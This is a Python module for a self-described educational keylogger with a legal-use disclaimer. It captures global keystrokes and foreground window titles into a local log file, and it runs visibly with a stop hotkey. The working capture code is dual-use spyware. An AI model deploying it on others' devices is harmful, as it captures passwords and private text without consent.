"""
Educational Python Keylogger
============================

A simple cross-platform keystroke logger that writes typed characters
to a local text file. Built for learning how operating systems expose
global input events to user-space programs.

ETHICAL USE ONLY
----------------
Only run this on devices you own, or where you have received explicit
written permission from the owner. Unauthorized keystroke logging is
illegal in most jurisdictions (e.g., the US Computer Fraud and Abuse
Act, the UK Computer Misuse Act, EU GDPR, etc.).

Design notes
------------
- Uses `pynput.keyboard.Listener`, which hooks the OS-level input
  subsystem in a background thread and invokes callbacks on events.
- Tracks currently-pressed keys in a set so we can detect a
  multi-key "stop" combo (Ctrl + Alt + K by default).
- Formats special keys (Enter, Tab, Backspace, arrows, ...) as
  readable tokens so the resulting log is human-skimmable.
- Optionally records foreground window title changes for context.
- Buffers writes and flushes on newline / stop for smoother typing.
"""

from __future__ import annotations

import sys
import threading
from datetime import datetime
from pathlib import Path
from typing import Iterable, Optional, TextIO

from pynput import keyboard

from window_info import get_foreground_title


# ---------------------------------------------------------------------------
# Key-set helpers
# ---------------------------------------------------------------------------
# pynput exposes a different set of Key members depending on platform
# (e.g. `cmd_l` exists on macOS but not on every Linux build). We build the
# modifier set defensively via getattr so the module imports cleanly anywhere.


def _collect_keys(names: Iterable[str]) -> set:
    """Return the subset of `keyboard.Key` members named in `names`."""
    out = set()
    for name in names:
        key = getattr(keyboard.Key, name, None)
        if key is not None:
            out.add(key)
    return out


CTRL_KEYS = _collect_keys(["ctrl", "ctrl_l", "ctrl_r"])
ALT_KEYS = _collect_keys(["alt", "alt_l", "alt_r", "alt_gr"])
SHIFT_KEYS = _collect_keys(["shift", "shift_l", "shift_r"])
CMD_KEYS = _collect_keys(["cmd", "cmd_l", "cmd_r"])
LOCK_KEYS = _collect_keys(["caps_lock", "num_lock", "scroll_lock"])

# Keys we never log on their own — they are either modifiers, or locks that
# don't carry content. We still *track* them (in `_pressed`) so we can
# detect combos like Ctrl+Alt+K.
MODIFIER_KEYS = CTRL_KEYS | ALT_KEYS | SHIFT_KEYS | CMD_KEYS | LOCK_KEYS

# Human-friendly rendering for non-printable keys.
SPECIAL_KEY_MAP = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.delete: "[DEL]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
    keyboard.Key.home: "[HOME]",
    keyboard.Key.end: "[END]",
    keyboard.Key.page_up: "[PGUP]",
    keyboard.Key.page_down: "[PGDN]",
}


def _supports_ansi() -> bool:
    if sys.platform == "win32":
        try:
            import ctypes

            kernel32 = ctypes.windll.kernel32
            handle = kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
            mode = ctypes.c_uint32()
            if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                return False
            # ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
            return kernel32.SetConsoleMode(handle, mode.value | 0x0004) != 0
        except Exception:  # noqa: BLE001
            return False
    return sys.stdout.isatty()


# ---------------------------------------------------------------------------
# KeyLogger
# ---------------------------------------------------------------------------


class KeyLogger:
    """Capture keystrokes and append them to a timestamped log file.

    Parameters
    ----------
    log_dir:
        Directory where log files are written. Created if missing.
    filename:
        Optional fixed filename. If omitted, a timestamped filename is used.
    stop_char:
        Character that, together with Ctrl and Alt, ends the session.
        Default is ``'k'`` → press Ctrl+Alt+K to stop.
    live:
        When True, echo each logged token to the console (educational).
    track_windows:
        When True, write a marker whenever the focused window changes.
    status:
        When True, show a live keystroke counter on stderr.
    """

    def __init__(
        self,
        log_dir: Path | str = "logs",
        filename: Optional[str] = None,
        stop_char: str = "k",
        live: bool = False,
        track_windows: bool = True,
        status: bool = True,
    ) -> None:
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)

        if filename is None:
            stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"keylog_{stamp}.txt"

        self.log_file = self.log_dir / filename
        self.stop_char = stop_char.lower()
        self.live = live
        self.track_windows = track_windows
        self.status = status

        self._pressed: set = set()
        self._key_count: int = 0
        self._started_at: Optional[datetime] = None
        self._buffer: list[str] = []
        self._lock = threading.Lock()
        self._last_window: Optional[str] = None
        self._fh: Optional[TextIO] = None
        self._ansi = _supports_ansi()
        self._stop_event = threading.Event()

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _is_stop_combo(self) -> bool:
        """True when Ctrl + Alt + <stop_char> are all currently held."""
        ctrl_down = any(k in self._pressed for k in CTRL_KEYS)
        alt_down = any(k in self._pressed for k in ALT_KEYS)
        stop_down = any(
            isinstance(k, keyboard.KeyCode)
            and getattr(k, "char", None) is not None
            and k.char.lower() == self.stop_char
            for k in self._pressed
        )
        return ctrl_down and alt_down and stop_down

    def _format_key(self, key) -> str:
        """Return a string representation for the log file, or '' to skip."""
        if key in MODIFIER_KEYS:
            return ""  # don't spam the log with bare modifier presses

        if key in SPECIAL_KEY_MAP:
            return SPECIAL_KEY_MAP[key]

        # Printable characters come through as KeyCode with a `char`.
        if isinstance(key, keyboard.KeyCode) and key.char is not None:
            return key.char

        # Fall-through: name-only keys (F-keys, media keys, etc.)
        name = getattr(key, "name", None) or str(key).replace("Key.", "")
        return f"[{name.upper()}]"

    def _flush(self) -> None:
        if not self._buffer or self._fh is None:
            return
        self._fh.write("".join(self._buffer))
        self._fh.flush()
        self._buffer.clear()

    def _append(self, text: str, *, force_flush: bool = False) -> None:
        """Buffer `text`; flush on newline, large buffer, or force."""
        with self._lock:
            self._buffer.append(text)
            if force_flush or "\n" in text or len(self._buffer) >= 64:
                self._flush()

    def _maybe_log_window(self) -> None:
        if not self.track_windows:
            return
        title = get_foreground_title()
        if not title or title == self._last_window:
            return
        self._last_window = title
        # Flush any pending keystrokes before the context marker.
        marker = f"\n[WINDOW] {title}\n"
        self._append(marker, force_flush=True)
        if self.live:
            self._echo(marker.rstrip("\n"))

    def _echo(self, token: str) -> None:
        """Print a live token without fighting the status line."""
        display = token.replace("\n", "[ENTER]\n").replace("\t", "[TAB]")
        if self.status and self._ansi:
            # Clear status line, print token, then redraw status.
            sys.stderr.write("\r\033[K")
            sys.stderr.flush()
            print(display, end="", flush=True)
            self._draw_status()
        else:
            print(display, end="", flush=True)

    def _draw_status(self) -> None:
        if not self.status:
            return
        elapsed = 0.0
        if self._started_at is not None:
            elapsed = (datetime.now() - self._started_at).total_seconds()
        mins, secs = divmod(int(elapsed), 60)
        line = (
            f"  keys: {self._key_count:<6}  "
            f"time: {mins:02d}:{secs:02d}  "
            f"stop: Ctrl+Alt+{self.stop_char.upper()}  "
        )
        if self._last_window:
            short = self._last_window if len(self._last_window) <= 40 else (
                self._last_window[:37] + "..."
            )
            line += f"app: {short}"
        if self._ansi:
            sys.stderr.write(f"\r\033[K{line}")
        else:
            sys.stderr.write(f"\r{line}")
        sys.stderr.flush()

    def _status_loop(self) -> None:
        while not self._stop_event.wait(0.5):
            self._draw_status()

    def _print_summary(self) -> None:
        ended = datetime.now()
        duration = 0.0
        if self._started_at is not None:
            duration = (ended - self._started_at).total_seconds()
        rate = self._key_count / duration if duration > 0 else 0.0

        if self.status and self._ansi:
            sys.stderr.write("\r\033[K")
            sys.stderr.flush()

        print()
        print("-" * 52)
        print("  Session complete")
        print(f"  Log file     : {self.log_file.resolve()}")
        print(f"  Keystrokes   : {self._key_count}")
        print(f"  Duration     : {duration:.1f}s")
        print(f"  Avg rate     : {rate:.1f} keys/s")
        print("-" * 52)
        print(f'  Tip: python main.py view "{self.log_file.name}"')
        print()

    # ------------------------------------------------------------------
    # pynput callbacks
    # ------------------------------------------------------------------

    def _on_press(self, key):
        self._pressed.add(key)

        if self._is_stop_combo():
            self._stop_event.set()
            footer = (
                f"\n\n=== Session ended {datetime.now():%Y-%m-%d %H:%M:%S} "
                f"({self._key_count} keystrokes captured) ===\n"
            )
            self._append(footer, force_flush=True)
            return False  # returning False from on_press stops the listener

        self._maybe_log_window()

        token = self._format_key(key)
        if token:
            self._append(token)
            self._key_count += 1
            if self.live:
                self._echo(token)
            elif self.status:
                self._draw_status()

    def _on_release(self, key):
        # Keep the pressed-set accurate so combos aren't "sticky".
        self._pressed.discard(key)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> Path:
        """Block until the stop combo; return the log file path."""
        self._started_at = datetime.now()
        self._fh = open(self.log_file, "a", encoding="utf-8")
        header = (
            f"=== Session started {self._started_at:%Y-%m-%d %H:%M:%S} ===\n"
        )
        self._append(header, force_flush=True)

        # Seed window context immediately so the first keys have a home.
        if self.track_windows:
            title = get_foreground_title()
            if title:
                self._last_window = title
                self._append(f"[WINDOW] {title}\n", force_flush=True)

        print(f"[*] Logging to : {self.log_file.resolve()}")
        print(f"[*] Stop with  : Ctrl+Alt+{self.stop_char.upper()}")
        if self.track_windows:
            print("[*] Window titles will be recorded when focus changes.")
        if self.live:
            print("[*] Live echo  : ON (keys appear below as you type)")
        print()

        status_thread: Optional[threading.Thread] = None
        if self.status:
            status_thread = threading.Thread(
                target=self._status_loop, daemon=True
            )
            status_thread.start()
            self._draw_status()

        try:
            with keyboard.Listener(
                on_press=self._on_press,
                on_release=self._on_release,
            ) as listener:
                listener.join()
        finally:
            self._stop_event.set()
            with self._lock:
                self._flush()
                if self._fh is not None:
                    self._fh.close()
                    self._fh = None
            if status_thread is not None:
                status_thread.join(timeout=1.0)
            self._print_summary()

        return self.log_file
